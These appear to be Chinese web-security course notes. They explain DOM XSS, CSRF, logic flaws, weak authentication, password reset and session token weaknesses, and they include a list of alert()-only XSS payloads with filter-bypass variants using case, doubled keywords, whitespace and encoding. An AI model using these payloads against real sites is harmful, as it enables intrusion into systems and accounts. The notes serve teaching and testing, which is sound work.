<p>元素节点<br>在“购物清单”例子中，<code>&lt;body&gt;</code>.<code>&lt;p&gt;</code>.<code> &lt;ul&gt;</code>之 类的元素在文档中的布局形成了文档的结构，它们即是元素节点。<br>文本节点<br>文档通常会包含一些内容， 这些内容多数由文本提供，如前面例子中，<code>&lt;p&gt;</code>包含着文本“欢迎购买”，它就是一个文本节点。<br>属性节点<br>元素或多或少都有一些属性， 属性用于对元素做出更具体的描述。</p>
<p>DOM型XSS漏洞是基于文档对象模型(Document Object Model)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如<br><code>document.getElementByld(&quot;x&quot; ).innerHTML</code>、<code>document.write</code>等。</p>
<p>数据流量走向: URL &gt;浏览器</p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">Xss payload构造以及变形</span></span><br><span class="line"><span class="xml">■XSS payload构造</span></span><br><span class="line"><span class="xml">➢利用[<span class="tag">&lt;&gt;</span>]构造HTML标签和<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">scrpt</span>&gt;</span>标签</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:green;&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用HTML标签的属性值(伪协议)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me !<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> (此标签需要在IE6下测试)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用事件</span></span><br><span class="line"><span class="xml">事件种类</span></span><br><span class="line"><span class="xml">●windows事件 对windows对象触发的事件</span></span><br><span class="line"><span class="xml">●Form事件HTML表单内的动作触发事件</span></span><br><span class="line"><span class="xml">●Keyboard事件 键盘按键</span></span><br><span class="line"><span class="xml">●Mouse事件 由鼠标或类似用户动作触发的事件</span></span><br><span class="line"><span class="xml">●Media事件 由多媒体触发的事件</span></span><br><span class="line"><span class="xml">参考链接:</span></span><br><span class="line"><span class="xml">htps://www.w3school.com.cn/tags/html_ ref_ eventatributes.asp</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用CSS</span></span><br><span class="line"><span class="xml">外部样式</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">expression</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/xss/))&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢大小写</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢双写关键字</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(/xss/)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢引号</span></span><br><span class="line"><span class="xml">如果在HTML标签中，可以不用引号;如果在js中，可以用反引号代替单双引号</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`)/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">xss</span>`/&gt;</span> (代替括号)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢[/] 代替空格</span></span><br><span class="line"><span class="xml">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(/xss/)&#x27;/&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢Tab与回车</span></span><br><span class="line"><span class="xml">在一些位置添加Tab (水平制表符)和回车符来绕过关键字检测</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j avascript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;j</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="xml">avascript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢编码</span></span><br><span class="line"><span class="xml">HTML实体编码</span></span><br><span class="line"><span class="xml">a 97 <span class="symbol">&amp;#97;</span> <span class="symbol">&amp;#x61;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>script:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">URL编码</span></span><br><span class="line"><span class="xml"></span><span class="perl">%<span class="number">3</span>Cscript%3Ealert(<span class="regexp">/xss/</span>)%3C/script%3E</span></span><br></pre></td></tr></table></figure>

<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><p>跨站请求伪造<br>原理总结<br>一个CSRF漏洞攻击的实现，其需要由“三个部分”来构成<br>1、有一个漏洞存在(无需验证、任意修改后台数据、新增请求) ;<br>2、伪装数据操作请求的恶意链接或者页面;<br>3、诱使用户主动访问或登录恶意链接，触发非法操作;</p>
<p>如果需要CSRF攻击能够成功，首先就需要目标站点或系统存在-个可以进行数据修改或者新增操作，且此操作被提交后台后的过程中,其未提供任何身份识别或校验的参数。后台只要收到请求，就立即下发数据修改或新增的操作; 以上漏洞情况的存在，出现比较多的场景有用户密码的修改、购物地址的修改或后台管理账户的新增等等操作过程中。</p>
<p>CSRF漏洞存在了，如果需要真正的被利用，还需要对“修改或新增”数据操作请求的伪装，此时恶意攻击者只要将伪装好的“数据修改或新增”的请求发送给被攻击者，或者通过社工的方式诱使被攻击者在其cookie还生效的情况下点击了此请求链接，即可触发CSRF漏洞， 成功修改或新增当前用户的数据信息，如修改当前用户的密码、又或者是当前用户为后台管理员，触发漏洞后新增了一个后台管理员。</p>
<p>当前用户在不知情的情况下，访问了黑客恶意构造的页面或在链接,即在非本意的情况下完成黑客想完成的“非法操作”,实现了对当前用户个人信息的恶意操作。</p>
<p>CSRF漏洞的目的:利用已存在的漏洞构遭了一个“恶意链接”或“html页面”。然后诱使用户点击触发此漏洞。目标站点存在一个漏洞(CSRF).攻击者利用此类漏洞伪装了一个链接或者html页面。诱使被攻击者在登录的情况下(即当前Cookie有效的情况下)点击了此伪装请求。随后在用户不知情的情况下完成了对当前用户数据的<br>修改或者新增操作。而被修改的信息可能是用户的密码.关键信息又或者新增后台管理员等。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/" class="post-title-link" itemprop="url">HW课程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-01 14:04:25" itemprop="dateCreated datePublished" datetime="2022-07-01T14:04:25+08:00">2022-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-02 22:07:54" itemprop="dateModified" datetime="2022-08-02T22:07:54+08:00">2022-08-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>154k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2:20</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h2><p><strong>前置知识点：</strong></p>
<p><strong>访问控制</strong>：在某种程度上来说，信息安全就是通过控制如何访问信息资源来防范资源泄露或未经授权修改的工作。<strong>访问控制(Access Control) 指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段</strong>。通常用于系统管理员控制用户对服务器、目录文件等网络资源的访问。访问控制是系统保密性，完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一。也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</p>
<p>访问是主体(Subject) 和客体(Object) 之间的信息流动，访问控制的主要目的是限制访问主体对客体的访问，从而保障数据资源在合法范围内得以有效使用和管理。为了达到上述目的，访问控制需要完成两个任务:识别和确认访问系统的用户，决定该用户可以对某一系统资源进行何种类型的访问。</p>
<p>访问控制包含三个要素，即主体、客体和访问控制策略。<br>主体(Subject) 是指访问中一个发出请求或要求的主动实体， 可以是某个用户，也可以是用户启动的程序。进程或设备等;<br>客体(Object) 是接受其他实体访问的被动实体，凡是可以被操作的信息资源对象都可以被看作客体，可以是文件、光盘、数据库等。<br>控制策略( Attribution )是主体对客体的访问规则集，限制主体对客体的访问权限。</p>
<p>主体访问客体通常需要4个步骤:<br>➢Identification –身份标识<br>➢Authentication –身份验证<br>➢Authorization –授权<br>➢Accountability –审计</p>
<p>访问控制模型是规定主体如何访问客体的一种架构，目前主要分为三种:<br>➢自主访问控制(Discretionary Access Control, DAC, 大部分使用)<br>➢强制访问控制(Mandatory Access Control, MAC)<br>➢角色型访问控制(Role- Based Access Control, RBAC)</p>
<p>■什么是逻辑漏洞<br>随着网络安全法的实施、企业和用户安全意识的提高，Web安全已经成为了重点关注的方向，诸如使用安全开发框架，部署安全防护设备等防护手段的使用，使得网站的常规漏洞越来越少。以SQL注入为例，由于其危害巨大，常年稳居OWASP Top 10的第一位， 目前很多Web开发框架在底层就直接杜绝的SQL注入问题。但“逻辑漏洞”一词现在却更加热门。很可能成为Web漏洞的主战场。之所以称之为“逻辑漏洞”。是因为在代码之后是人的逻辑，人更容易犯错，是编写完程序后随着人的思维理解产生的不足， 所以逻辑漏洞一直都在。相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、 XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测；所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题，逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。一般出现在密码修改(没有旧密码验证)、越权访问、密码找回，交易支付等功能处。而且由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止， 这类问题往往危害巨大，可能造成了企业的资产损失和名誉受损，所以导致了逻辑漏洞成为了企业防护中的难题。</p>
<p>■逻辑洞的分类<br>➢验证机制缺陷<br>➢会话管理缺陷<br>➢权限管理缺陷<br>➢业务逻辑缺陷</p>
<h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a><strong>验证机制</strong></h2><p>在网络中，身份是区别于其他个体的一种标识，为了与其他个体有所区别，身份必须具有唯一性。 网络中，身份不仅仅用于标识一个人，也可以用于标识一个机器，一个物体，甚至一个虚拟的东西(如进程、会话过程等) 。网络中的认证不是对某个事物的资质审查，而是对事物真实性的确认。身份认证的目的是鉴别通信中另一端的真实身份，防止伪造和假冒等情况发生。</p>
<p>根据身份认证的对象不同，认证手段也不同，但针对每种身份的认证都有很多种不同的方法。如果被认证的对象是人，则有三类信息可以用于认证:<br>➢Who knows：某人所知道的内容，这类信息通常理解为口令<br>➢Who has:某人所拥有的物品。这类信息包括密码本、密码卡、U盾<br>➢Who is:某人的身份，这类信息包括指纹、虹膜、脸型、语音特征等</p>
<p>一般情况下， 对人的认证只需要一种类型的信息即可， 如口令(常用于登录网站)、指纹(常用于登录电脑和门禁设备)、U盾(常用于网络金融业务)，而用户的身份信息就是该用户的账户名。</p>
<p>如果被认证的对象是一般的设备，则通常使用“挑战-应答”机制，即认证者发起一个挑战，被认证者进行应答，认证者对应答进行检验，如果符合要求，则通过认证，否则拒绝。验证机制是信息系统安全机制中最简单、最前沿的一种机制。最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误即拒绝用户登录。</p>
<p><strong>验证机制设计缺陷</strong></p>
<p>■可预测的用户名<br>有些应用程序需要用户注册时用户名符合某一特定规则， 比如需要满足“姓名缩写_数字”的这种形式，其中数字是为了防止用户名重复，也就是说如果在存在姓名缩写相同的情况下后面要跟数字或者进行数字累加。这种在学校邮箱注册时是比较常见的。通过这种方式攻击者可以很方便的获得大量有效用户名。</p>
<p> ■非唯一性用户名<br>极少部分的应用程序不要求用户名的唯一性，这就可能造成这样的问题:在恰巧有两名用户使用相同的用户名及密码的情况下，应用程序要么阻止第二个用户设置密码， 要么允许其设置相同的密码。前者这种情况可能导致第一名用户的密码泄露给第二名用户，这种情况下攻击者如果想获得某个已知用户名对应的密码则可以通过注册功能针对于此用户名使用不同的密码注册，如果应用程序返回禁止注册，那么我们可以推测出此次注册时的密码就是这个用户名对应的密码。后者则可能导致第二名用户可以访问第一名用户的状态。</p>
<p>■弱口令.<br>弱口令(Weak Password)指容易被他人猜到的口令，除123456、 12345678、admin等常见口令外，生日、姓名、手机号、1qaz@WSX也被称为弱口令。为节省攻击成本，通常会适用弱口令字典进行字典攻击</p>
<p>■密码确认不完善</p>
<p>一些应用程序在用户注册设置密码时，出于一些原因往往会对密码进行如下处理:<br>➢截断前n个字符<br>➢大小写不敏感<br>➢删除特殊字符<br>上述操作均会减少应用程序的密码空间，攻击者通过仔细分析应用程序的密码处理规则后，可以适当修改自己的暴破字典从而提高暴破的成功率。</p>
<p>■可预测的密码<br>在像学校，企业这种存在批量注册大量用户需求的应用程序中，经常会为批量用户设置默认密码，这种默认密码可以是相同的也可以是与用户名或者其身份证信息等有关系的，这种情况下攻击者可以通过Google hacking来在公开信息汇总收集大量初始密码，也可以根据默认密码规律推测出大量密码。</p>
<p>  ■暴力破解<br>暴力破解_ (Brute Force)。也可称为蛮力攻击，指利用穷举法将所有的可能性一一尝试， 理论上可以破解所有密码问题。实际测试中，考虑到攻击成本问题，通常使用字典攻击(Dictinary Atack)，即逐一尝试用户自定义词典中的可能密码(单词或短语)的攻击方式。对于暴力破解，还有一些多余的提示信息可以利用。 比如登录失败后，提示“用户名不存在” 、“密码错误”、 “用户未注册” 等提示信息，通过这些信息可以更加快速的推断出用户名及密码。如果应用程序允许用户在登录失败很多次后。仍能继续尝试登录，那么这种情况下此应用可能存在暴破攻击。为了防止暴破攻击，应用程序应该设置用户登录失败次数上限，当用户失败的登录次数达到上限后应用程序应该阻止用户进一步的登录。但是通过前端脚本或者Cookie来统计用户失败的登录次数是不可靠的，因为这些都是攻击者可以接触到并且可以修改的，如果服务器端使用Session来存储用户失败登录的次数这样就可靠的多。除了用户登录次数的统计问题外，如何处理失败登录次数达到上限的用户也是一个需要谨慎处理的问题，如果用户在登录失败很多次后被锁定，但是锁定状态下的用户使用正确密码登录时和使用错误密码登录时Web应用程序的响应信息不同那么此时此应用还是存在暴破漏洞，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706160755467.png" alt="image-20220706160755467"></p>
<p>■可利用信息<br>➢多余的提示信息<br>登录失败后，不应该提示如“用户不存在”、”密码错误”、“用户未注册”等详细信息，通过这些信息可推断出用户名、密码等其他信息<br>➢可预测信息<br>●类似user100、user101的用户名， 手机号信息<br>●类似于ABC123、123456的初始密码</p>
<p>在暴力破解的时候，若拥有验证码还需要绕过验证码，验证码常见的有图片验证码和短信验证码。<br>➢图片验证码<br>验证码不生效/不更新/不失效<br>验证码可预测/删除/获取<br>验证码可识别<br>➢短信验证码<br>●4/6位验证码<br>●篡改手机号<br>●篡改Response</p>
<p>■密码重置<br>在逻辑漏洞中密码重置问题是比较常见的一种场景，常见于用户修改密码页面、用户找回密码页面等涉及到网站重置密码功能的页面。<br>➢修改密码<br>目前的修改密码的方式大概可以分为两种，第一种是要求用户键入用户名、旧密码、新密码、确认新密码四部分，一些Web应用程序会忽略修改密码处旧密码错误输入次数过多的问题，这就容易被攻击者利用来进行密码暴破;还有一种最不安全的情况就是只需要用户键入用户名、新密码、确认新密码即可更改用户名相应的密码，这种情况下攻击者无需暴破即可获得正确的用户名及密码组合。</p>
<p>➢找回密码<br>●忘记密码功能往往通过设置一组问题来验证用户身份。比如这些问题可以是“我最喜欢的颜色”，这些问题的答案组合次数相对于密码来说小的多，并且可以通过信息收集工作来提供辅助。攻击者可以收集一组用户名并逐个遍历然后记录相应的问题在其中选择最简单的那个下手可以获得更高的成功率<br>●忘记密码处可能不会设置错误次数限制从而允许攻击者猜测上述问题的答案<br>●通常Web应用程序也会设置密码暗示来代替上述问题，这些密码暗示往往能够辅助攻击者猜测密码，有些用户甚至直接把密码设置为密码暗示。攻击者同样可以通过枚举收集到的用户名然后获得一组密码暗示， 从而寻找出最容易获得的密码</p>
<p>●当前Web应用程序可能通过向用户邮箱发送密码重置链接来帮助用户修改密码，这种链接是随机的攻击者很难对其进行猜解。但是有些应用在设计这个逻辑时可能允许Web应用程序将用户密码修复的邮件发送至攻击者，有时邮箱地址并没有直接显示出来而是存储在隐藏的表单中这时攻击者可以将邮箱修改为自己的邮箱。在最差的情况下攻击者可以尝试推测密码重置的URL来重置用户密码</p>
<p>■常见密码重置问题<br>➢用户名枚举:网站反馈多余信息，可猜测用户信息（用户不存在）<br>➢验证码返回前端处理:可截获、修改（bp）<br>➢修改Request:用户名、手机号。Cookie等信息可修改<br>➢修改Response:操作结果成功失败可修改<br>➢暴力破解验证码:验证码长度有限，或验证码未设置可靠的失效时间<br>➢拼凑密码重置链接:重置密码链接有规可循</p>
<p>■记住密码<br>一些应用程序为了方便用户访问通常会提供“记住密码”的功能，此功能通常仅通过cookie中的某个字段来实现。比如Cookie中会设置一个存储用户名的字段来实现基础的功能，如果这样的话攻击者仅需要随便注册个用户然后将Cookie中用户名修改为其想要访问用户的用户名即可实现对目标用户的访问。Cookie中还可能通过存储一个ID字段来唯一的标识用户，这种情况下攻击者可以遍历ID从而实现遍历访问用户。</p>
<h2 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a><strong>会话管理</strong></h2><p>在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程。会话管理分类:桌面会话管理、浏览器会话管理、Web服务器的会话管理。桌面会话管理器是一个程序，可以保存和恢复桌面会话，桌面会话是所有正在运行的窗口和当前的内容。受会话管理的应用程序，在保存会话的设置时，会话管理器会保存受该会话管理的所有应用程序。如果注销后再次登录，会话管理器会自动启动<br>受该会话管理的应用程序；不受会话管理的应用程序，必须手动启动这些应用程序。浏览器会话管理是打开网页浏克器时，用户可以保存所有打开的网页和设定，并在以后恢复他们的日期。为了帮助恢复系统或应用软件崩溃，页面和设置也可以在下次运行恢复。</p>
<p>HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。 它也可以简单理解为一个用户从登录到退出应用的一段期间。<br>常见的Web应用会话管理的方式有以下3种:<br>基于server端session的管理方式<br>cookie based的管理方式<br>token-based的管理方式</p>
<p>HTTP协议</p>
<p>➢无连接<br>●每次连接只处理一个请求。服务器处理完客户的请求，井收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。<br>➢无状态<br>●指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送HTTP请求之后，服务器根据请求，会给我们发送数据过来，但是发送完，不会记录任何信息。<br>➢会话<br>●执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标识符，用户在每一个请求中提交这个令牌。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706170145312.png" alt="image-20220706170145312"></p>
<p>■如何攻击会话管理机制<br>    ■确定会话令牌<br>➢多个数据共同表示一个会话令牌，包括Cookie、URL参数以及隐藏的表单参数<br>➢标准的会话Cookie可能存在但是Web应用程序未对其进行使用<br>➢观察用户登录前后客户端保存数据的变化，这些变化中包含了建立新会话的令牌<br>➢通过删除客户端向服务器端发送的参数来进行判断，比如在删除了某个参数后无法正常访问用户的个人资料，那么这个参数应该与会话令牌有关</p>
<p>■令牌使用情景<br>➢发送到用户注册邮箱的密码恢复令牌<br>➢防止CSRF的会话令牌<br>➢用于一次性访问受保护资源的令牌<br>➢未使用验证的购物应用程序的消费者用于检索现有订单状态的令牌</p>
<p>■令牌有含义<br>我们常规抓取http数据包所观察到的令牌内容多是杂乱无序的字符串，不同用户之间的令牌也无任何规律。但是也不排除有些系统会有意设置具有含义的令牌字符，如:<br>➢用户名称:如user、admin、 system<br>➢用户标识:如0001、0002、 0003<br>➢用户权限: admin、00101、 01000<br>➢用户姓/名: zhangsan<br>➢日期/时间戳<br>➢电子邮箱<br>➢可预测数字</p>
<p>■令牌可预测<br>隐含序列:有时我们并不能直接的通过观察令牌来发现其隐含的序列或者规律，我们可以通过对令牌进行解码，然后发挥想象力通过各种运算或者操作来发现解密后令牌中所蕴含的规律或者隐含的序列。<br>时间依赖: 一些Web服务器和应用程序使用时间来参与令牌的生成。如果使用时间生成令牌的算法没有合并足够的熵，攻击者就可能推测出其他用    户的令牌。生成数字的随机性不强:计算机生成的随机数都是伪随机数，如果伪随机数的算法强度较弱，那么生成随机数很可能被预测，令牌加密函数对外开放或暴露:如果攻击者可以接触到会话令牌生成函数的源码、算法过程或者相应加密过程的入口(即攻击者可以通过此入口获得任何数据经过和令牌相同的加密方式后的数据) .那么攻击者就可以详细的了解令牌生成的过程，从而模仿此过程对令牌进行伪造。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706171032986.png" alt="image-20220706171032986"></p>
<p>sessionID是无序字符串</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706171222206.png" alt="image-20220706171222206"></p>
<p>■在网络上泄露令牌<br>➢应用程序在登录阶段那使用HTTPS，但是登录成功后转为使用HTTP或者可以访问验证前使用HTTP的链接，这样尽管保护了用户的证书，却保护不了用户的会话令牌<br>➢用户在首次访问某一网站时使用HTTP协议， 往往此时服务器已经给客户端发布了会话令牌，当用户进行登录时，即使网站转换使用HTTPS，那么在令牌不改变的情况下，原先处于暴露环境中的令牌此刻升级为具有通过验证的令牌<br>➢如果登录界面允许使用HTTP协议登录，那么攻击者可以通过各种方式使用户在登录时使用HTTP协议<br>➢在用户使用HTTPS协议登录后，如果网页在加载像图片等静态资源时使用的是HTTP协议，用户的会话令牌还是可以通过此泄露</p>
<p>■在日志中泄露令牌<br>➢协助网络管理人员的系统日志如果记录了最近的会话日志，且未对访问控制进行严格管理，那么在此种情况下，攻击者可能通过日志获得登录会话<br>➢如果应用程序将会话置于URL中，那么这些会话会被记录在:<br>●用户浏览器的日志中<br>●Web服务器日志<br>●企业或ISP代理服务器日志<br>●反向代理服务器日志<br>●任何站外服务器的Referer (最危险的方式)</p>
<p>■会话令牌与会话的映射易受到攻击<br>➢允许并行登录<br>➢使用静态令牌，即一个用户令牌发布后不再改变</p>
<p>■客户端暴露在令牌劫持风险中<br>网站存在如下攻击，容易造成会话令牌被劫持<br>➢XSS  ➢CSRF  ➢会话固定<br>●认证前就发布令牌<br>●认证后获得的会话令牌可重新用于其他用户认证<br>●应用程序接受伪造令牌</p>
<p>■令牌有效期过长<br>➢是否需要在一段时间后使令牌失效<br>➢是否需要在关闭刘览器时使令牌失效<br>■令牌尝试次数过多<br>➢可以考虑在令牌提交次数过多时候使令牌失效<br>■无效的令牌重置的手段<br>➢注销后令牌是否还有效</p>
